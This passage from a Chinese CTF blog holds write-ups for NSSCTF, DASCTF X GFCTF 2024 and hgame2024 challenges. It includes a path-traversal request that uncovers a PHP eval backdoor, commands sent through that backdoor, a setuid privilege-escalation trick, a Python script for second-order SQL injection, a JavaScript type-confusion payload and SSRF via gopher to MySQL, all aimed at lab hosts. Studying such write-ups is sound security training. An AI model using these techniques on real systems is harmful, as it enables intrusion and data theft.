alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable constant_">GET</span> /?c=root&amp;m=downloadRequestLog&amp;filename=<span class="hljs-number">20240424.</span>txt <span class="hljs-variable constant_">HTTP</span>/<span class="hljs-number">1.1</span><br><span class="hljs-title class_">Host</span>: node4.<span class="hljs-property">anna</span>.<span class="hljs-property">nssctf</span>.<span class="hljs-property">cn</span>:<span class="hljs-number">28896</span><br><span class="hljs-title class_">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="hljs-comment">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36</span><br><span class="hljs-comment">Referer: http://node4.anna.nssctf.cn:28896/?c=root&amp;m=getLogList</span><br><span class="hljs-comment">Cookie: PHPSESSID=26ad8fbd4be248b8b3beb898d494838e</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br></code></pre></td></tr></table></figure><p><img src="/mdimg/eczr/1713929935090-36ba1db7-2a6c-48ed-996d-ad59a9033246.png" alt="image.png"><br><code>../../../var/www/html/phpinfo.php</code>发现后门</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;?php </span><br><span class="hljs-meta">if(md5(@$_GET[&#x27;pass_31d5df001717&#x27;])===&#x27;3fde6bb0541387e4ebdadf7c2ff31123&#x27;)&#123;@eval($_GET[&#x27;cc&#x27;]);&#125; </span><br><span class="hljs-meta">// hint: Checker will not detect the existence of phpinfo.php, please delete the file when fixing the vulnerability.</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>/phpinfo.php?pass_31d5df001717=1q2w3e&amp;cc=system(&#39;ls&#39;);</code><br><code>[http://node4.anna.nssctf.cn:28072/phpinfo.php?pass_31d5df001717=1q2w3e&amp;cc=eval($_POST[1]);](http://node4.anna.nssctf.cn:28072/phpinfo.php?pass_31d5df001717=1q2w3e&amp;cc=eval($_POST[1]);)</code><br>连接antsward<br>发现没权限读flag<br><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code><br>看到sed命令有s权限</p><blockquote><p><strong>sed操作：</strong><br><strong>a：增加，在当前行下面增加一行指定内容。<br>c：替换，讲选定行替换为指定内容。<br>d：删除，删除选定的行。<br>i：插入，在选定行上面插入一行指定内容。<br>p：打印，如果同时指定行，表示打印指定行；如果不指定行，则表示打印所有内容，如果又非打印字符，则以ASCLL码输出。通常与“-n”选项一起使用。<br>s：替换，替换指定字符<br>y：字符转换</strong></p></blockquote><p><code>sed p /flag</code><br><img src="/mdimg/eczr/1713930887104-d76a728d-e7ce-420b-927e-6c62e3b4841f.png" alt="image.png"></p><p>例题4<br>注册回显，有过滤</p><h3 id="网鼎杯-2018-unfinish"><a href="#网鼎杯-2018-unfinish" class="headerlink" title="[网鼎杯 2018]unfinish"></a>[网鼎杯 2018]unfinish</h3><p>猜测有注册路由<code>register.php</code><br>注册username <code>1&#39;and &#39;0</code> 登录<br>回显用户名为0，存在二次注入<br><img src="/mdimg/eczr/1713937230134-9705a9b3-3d0f-43d1-9e57-05bbed0e82d5.png" alt="image.png"><br>测试发现有些注册不了，存在过滤<br>过滤了<code>,</code>和information等<br>这里username限制了长度，爆不出表名，只能嗯猜<code>select flag from flag</code><br>可以用类似<code>0&#39;+ascii(substr(database() from 1 for 1))+&#39;0;</code>的方式回显出数据的ascii<br>如法炮制注flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br><br>def <span class="hljs-title function_">search</span>(url):<br>    flag = <span class="hljs-string">&#x27;&#x27;</span><br>    url1 = url + <span class="hljs-string">&#x27;register.php&#x27;</span><br>    url2 = url + <span class="hljs-string">&#x27;login.php&#x27;</span><br>    session = requests.<span class="hljs-title class_">Session</span>()<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title function_">range</span>(<span class="hljs-number">100</span>):<br>        <span class="hljs-title function_">sleep</span>(<span class="hljs-number">0.3</span>)  # 避免过于频繁的请求<br>        data1 = &#123;<br>            <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-title function_">format</span>(i),<br>            <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="hljs-title function_">format</span>(i),<br>            <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span><br>        &#125;<br>        data2 = &#123;<span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="hljs-title function_">format</span>(i), <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>&#125;<br><br>        <span class="hljs-attr">try</span>:<br>            # 注册<br>            r1 = session.<span class="hljs-title function_">post</span>(url1, data=data1)<br>            # 登录<br>            r2 = session.<span class="hljs-title function_">post</span>(url2, data=data2)<br>            # 解析响应<br>            res = re.<span class="hljs-title function_">search</span>(r<span class="hljs-string">&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>, r2.<span class="hljs-property">text</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-attr">res</span>:<br>                res1 = re.<span class="hljs-title function_">search</span>(r<span class="hljs-string">&#x27;\d+&#x27;</span>, res.<span class="hljs-title function_">group</span>())<br>                flag += <span class="hljs-title function_">chr</span>(<span class="hljs-title function_">int</span>(res1.<span class="hljs-title function_">group</span>()))<br>                <span class="hljs-title function_">print</span>(flag)<br>            <span class="hljs-attr">else</span>:<br>                logging.<span class="hljs-title function_">debug</span>(<span class="hljs-string">&quot;未找到匹配的数据&quot;</span>)<br>        except requests.<span class="hljs-property">RequestException</span> <span class="hljs-keyword">as</span> <span class="hljs-attr">e</span>:<br>            logging.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;请求错误: %s&quot;</span>, e)<br><br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;final:&quot;</span> + flag)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-title function_">search</span>(<span class="hljs-string">&#x27;http://node4.anna.nssctf.cn:28435/&#x27;</span>)<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF X GFCTF 2024｜四月开启第一局</title>
    <link href="/2024/04/20/DASCTF%20X%20GFCTF%202024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/"/>
    <url>/2024/04/20/DASCTF%20X%20GFCTF%202024%EF%BD%9C%E5%9B%9B%E6%9C%88%E5%BC%80%E5%90%AF%E7%AC%AC%E4%B8%80%E5%B1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="cool-index"><a href="#cool-index" class="headerlink" title="cool_index"></a>cool_index</h1><p><img src="/mdimg/DASCTFXGFCTF2024/1713603570881-2690a145-002d-4cab-8ce8-fe957fb1f6cc.png"><br>查看源码<br>在server.js<br><code>const JWT_SECRET = crypto.randomBytes(64).toString(&quot;hex&quot;);</code><br>jwt的key被设置为64位的随机字节的16进制，想爆破基本不行<br>flag放在了articles数组的最后一个<br>在/article路由中</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs javascript">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&quot;/article&quot;</span>, <span class="hljs-function">(<span class="hljs-params">req, res</span>) =&gt;</span> &#123;<br>  <span class="hljs-keyword">const</span> token = req.<span class="hljs-property">cookies</span>.<span class="hljs-property">token</span>;<br>  <span class="hljs-keyword">if</span> (token) &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">const</span> decoded = jwt.<span class="hljs-title function_">verify</span>(token, <span class="hljs-variable constant_">JWT_SECRET</span>);<br>      <span class="hljs-keyword">let</span> index = req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span>;<br>      <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">index</span> &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;你知道我要说什么&quot;</span> &#125;);<br>      &#125;<br>      <span class="hljs-keyword">if</span> (decoded.<span class="hljs-property">subscription</span> !== <span class="hljs-string">&quot;premium&quot;</span> &amp;&amp; index &gt;= <span class="hljs-number">7</span>) &#123;<br>        <span class="hljs-keyword">return</span> res<br>          .<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>)<br>          .<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;订阅高级会员以解锁&quot;</span> &#125;);<br>      &#125;<br>      index = <span class="hljs-built_in">parseInt</span>(index);<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Number</span>.<span class="hljs-built_in">isNaN</span>(index) || index &gt; articles.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">400</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;你知道我要说什么&quot;</span> &#125;);<br>      &#125;<br><br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(articles[index]);<br>    &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>      res.<span class="hljs-title function_">clearCookie</span>(<span class="hljs-string">&quot;token&quot;</span>);<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;重新登录罢&quot;</span> &#125;);<br>    &#125;<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">status</span>(<span class="hljs-number">403</span>).<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">message</span>: <span class="hljs-string">&quot;未登录&quot;</span> &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><code>return res.json(articles[index]);</code>有机会可以输出flag<br>需要绕过前面3个if<br>index不能小于0不能大于数组长度-1也就是7<br>其中前两个if直接去index值<br>而在第三个if前执行了   <code> index = parseInt(index);</code>将index转为int值 然后判断<code>Number.isNaN(index)</code>index传入的值是否为 NaN（Not-a-Number）<br>js  中&gt;比较会先类型转换<br>如果数组包含多个元素或元素不能转换为数字，数组将不会被转换为一个有效的数字，而是返回 NaN（Not-a-Number）。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;7&quot;</span>&gt;=<span class="hljs-number">7</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-string">&quot;7&quot;</span>] &gt;= <span class="hljs-number">7</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">7</span>]&gt;=<span class="hljs-number">7</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">7</span>,<span class="hljs-string">&quot;7&quot;</span>] &gt;= <span class="hljs-number">7</span>)<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-built_in">parseInt</span>([<span class="hljs-number">7</span>, <span class="hljs-string">&quot;7&quot;</span>]))<br><br><span class="hljs-literal">true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">true</span><br><span class="hljs-literal">false</span><br><span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>payload<code>&#123;&quot;index&quot;:[7,&quot;7&quot;]&#125;</code></p><h1 id="EasySignin"><a href="#EasySignin" class="headerlink" title="EasySignin"></a>EasySignin</h1><p>随便注册一个账号<br>发现在修改密码的update.php<br>注册一个账号进去<br>然后<br><img src="/mdimg/DASCTFXGFCTF2024/1713607005355-f89d122f-5db7-4245-a2e6-b990f4ee8b51.png"><br>登录后admin发现<code>/getpicture.php?url=[https://tvax3.sinaimg.cn//large/0072Vf1pgy1foxkc9gjl2j31hc0u0h7m.jpg](https://tvax3.sinaimg.cn//large/0072Vf1pgy1foxkc9gjl2j31hc0u0h7m.jpg)</code>存在ssrf<br>gopher打mysql<br><img src="/mdimg/DASCTFXGFCTF2024/1713607077649-abd09512-b195-427b-8937-8d9a91c50be6.png"></p><p>把gopher://127.0.0.1:3306/_ 后的的再次url编码</p><p><img src="/mdimg/DASCTFXGFCTF2024/1713607086147-61d790e6-59eb-440e-97df-27d8a1289bba.png"><br>解码返回的base64得到flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hgame2024</title>
    <link href="/2024/02/16/hgame2024/"/>
    <url>/2024/02/16/hgame2024/</url>
    
    <content type="html"><![CDATA[<h1 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ezHTTP"><a href="#ezHTTP" class="headerlink" title="ezHTTP"></a>ezHTTP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">GET / HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">139.196</span><span class="hljs-number">.200</span><span class="hljs-number">.143</span>:<span class="hljs-number">32581</span><br>Cache-Control: <span class="hljs-built_in">max</span>-age=<span class="hljs-number">0</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>User-Agent:Mozilla/<span class="hljs-number">5.0</span> (Vidar; VidarOS x86_64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">121.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> Safari/<span class="hljs-number">537.36</span> Edg/<span class="hljs-number">121.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><br>X-Real-IP:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>Referer:vidar.club<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><br>Connection: close<br></code></pre></td></tr></table></figure><p>返回包</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJGMTRnIjoiaGdhbWV7SFRUUF8hc18xbVAwclQ0bnR9In0.VKMdRQllG61JTReFhmbcfIdq7MvJDncYpjaT7zttEDc<br></code></pre></td></tr></table></figure><p><a href="https://jwt.io/">https://jwt.io/</a>decode<br><code>hgame&#123;HTTP_!s_1mP0rT4nt&#125;</code></p><h3 id="Bypass-it"><a href="#Bypass-it" class="headerlink" title="Bypass it"></a>Bypass it</h3><p>访问注册时设置了js重定向<br>把浏览器js关掉注册登录即可<br>用<a href="https://chromewebstore.google.com/detail/disable-javascript/jfpdlihdedhlmhlbgooailmfhahieoem?hl=zh-CN&utm_source=ext_sidebar">https://chromewebstore.google.com/detail/disable-javascript/jfpdlihdedhlmhlbgooailmfhahieoem?hl=zh-CN&amp;utm_source=ext_sidebar</a>Disable JavaScript 插件</p><h3 id="Select-Courses"><a href="#Select-Courses" class="headerlink" title="Select Courses"></a>Select Courses</h3><p>选课时发送id到api，发现时不时会有课有空位，写脚本抢即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&#x27;http://47.100.245.185:31531/api/courses&#x27;</span><br>headers = &#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>: <span class="hljs-string">&#x27;application/json&#x27;</span>&#125;<br><br><span class="hljs-comment"># 循环发送ID 1-5</span><br><span class="hljs-keyword">for</span> <span class="hljs-built_in">id</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>):  <span class="hljs-comment"># 发送ID 1-5</span><br>    data = <span class="hljs-string">&#x27;&#123;&quot;id&quot;:%d&#125;&#x27;</span> % <span class="hljs-built_in">id</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = requests.post(url, data=data, headers=headers)<br>        <span class="hljs-comment"># 打印响应内容</span><br>        <span class="hljs-built_in">print</span>(r.text)<br>        time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 等待2秒</span><br><br>        <span class="hljs-comment"># 检查响应中是否包含&#x27;&quot;full&quot;:0&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&quot;full&quot;:0&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;&quot;full&quot;:1&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></td></tr></table></figure><h3 id="2048-16"><a href="#2048-16" class="headerlink" title="2048*16"></a>2048*16</h3><p>在js里找到：<br><code>message</code> ：<code>ITMCnzbCn5eFIC=6yliXfzN=I5NMnz0XIC==yzycysi70ci7y7iK</code><br>和<code>game-won</code>表： <code>V+g5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl=QcTq6JkWK4t3</code><br><a href="https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89('V%2Bg5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl%3DQcTq6JkWK4t3',true)&input=SVRNQ256YkNuNWVGSUM9NnlsaVhmek49STVOTW56MFhJQz09eXp5Y3lzaTcwY2k3eTdpSw">https://ctf.mzy0.com/CyberChef3/#recipe=From_Base64%EF%BC%88Base64%E8%BD%AC%E6%8D%A2%EF%BC%89(‘V%2Bg5LpoEej/fy0nPNivz9SswHIhGaDOmU8CuXb72dB1xYMrZFRAl%3DQcTq6JkWK4t3’,true)&amp;input=SVRNQ256YkNuNWVGSUM9NnlsaVhmek49STVOTW56MFhJQz09eXp5Y3lzaTcwY2k3eTdpSw</a><br><code>flag&#123;b99b820f-934d-44d4-93df-41361df7df2d&#125;</code></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h3><p><code>hgame&#123;WOW_GREAT_YOU_SEE_IT_WONDERFUL&#125;</code></p><h3 id="希儿希儿希尔"><a href="#希儿希儿希尔" class="headerlink" title="希儿希儿希尔"></a>希儿希儿希尔</h3><p>看题目猜到是希尔密码<br><img src="/mdimg/hgame2024/1706540285516-e66d2a3c-1e6d-46a7-b896-0479b54e2928.png"><br>foremost分离<br><code>CVOCRJGMKLDJGBQIUIVXHEYLPNWR</code><br><img src="/mdimg/hgame2024/1706540334383-ccbb0fe8-459a-4192-9927-9153dfebefa8.png"><br><code>hgame&#123;DISAPPEARINTHESEAOFBUTTERFLY&#125;</code></p><h3 id="simple-attack"><a href="#simple-attack" class="headerlink" title="simple_attack"></a>simple_attack</h3><p><img src="/mdimg/hgame2024/1706779235517-a2cac9bf-acbb-4dc0-8445-8b7e1f96d9e6.png"><br><a href="https://tool.jisuapi.com/base642pic.html">https://tool.jisuapi.com/base642pic.html</a><br><code>**hgame&#123;s1mple_attack_for_zip&#125;**</code></p><h3 id="来自星尘的问候"><a href="#来自星尘的问候" class="headerlink" title="来自星尘的问候"></a>来自星尘的问候</h3><p><img src="/mdimg/hgame2024/1706779553589-e6663d77-4fb4-4027-a45d-4c74b5ec02f9.png"><br><img src="/mdimg/hgame2024/1706779423474-ba58678a-228f-4f88-a14e-b05129f41492.jpeg"><br><a href="https://my1l.github.io/Ctrl/CtrlAstr.html">https://my1l.github.io/Ctrl/CtrlAstr.html</a><br><code>**hgame&#123;welc0me!&#125;**</code></p><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> gmpy2<br>p = <span class="hljs-number">149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669</span><br>q = <span class="hljs-number">116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461</span><br>c = <span class="hljs-number">10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971</span><br><br>n=p*q<br>phi=(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>e=<span class="hljs-number">0x10001</span><br>d=gmpy2.invert(e,phi)<br><br>m= <span class="hljs-built_in">pow</span>(c,d,n)<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h1 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h1><h2 id="misc-1"><a href="#misc-1" class="headerlink" title="misc"></a>misc</h2><h3 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h3><p>追踪 <code>tcp.stream eq 0</code><br>提取hexdump  jpg<br><code>hgame&#123;ek1ng_want_girlfriend_qq_761042182&#125;</code></p><h3 id="ezWord"><a href="#ezWord" class="headerlink" title="ezWord"></a>ezWord</h3><p>改为zip<br><code>word\media</code><br><code>恭喜你找到了这些东西，现在你离flag只差解开这个新的压缩包，然后对压缩包里的东西进行两层解密就能获得flag了。压缩包的密码和我放在这的两张图片有关。</code><br><img src="/mdimg/hgame2024/1707214030998-68a51f73-b765-47fb-beb4-a0b1d326e3e8.png"><br><img src="/mdimg/hgame2024/1707214045712-2d93a624-220c-4363-b79f-6fcf9dd3f700.png"><br><code>T1hi3sI4sKey</code><br><code>你好，很高兴你看到了这个压缩包。请注意：这个压缩包的密码有11位数而且包含大写字母小写字母和数字。还有一个要注意的是，里面的这一堆英文decode之后看上去是一堆中文乱码实际上这是正常现象，如果看到它们那么你就离成功只差一步了。</code></p><figure class="highlight tp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span 